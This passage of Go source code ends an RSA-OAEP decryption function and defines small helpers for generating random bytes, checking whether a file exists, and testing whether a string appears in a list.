    ct, _ := base64.StdEncoding.DecodeString(cipherText)
    rng := rand.Reader
    plaintext, err := rsa.DecryptOAEP(sha512.New(), rng, &privateKey, ct, nil)
    if err != nil {
        fmt.Println(err)
    }
    return plaintext
}

func random_Bytes(l int, t bool) []byte {
	b := make([]byte, l)
	if t == true { // secure rand
		rand.Read(b)
	} else {
		rdmod.Read(b)
	}

	return b
}

func file_Exists(filePath string) bool {
	_, err := os.Stat(filePath)
	return !os.IsNotExist(err)
}

func inFindStr(a string, list []string) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}
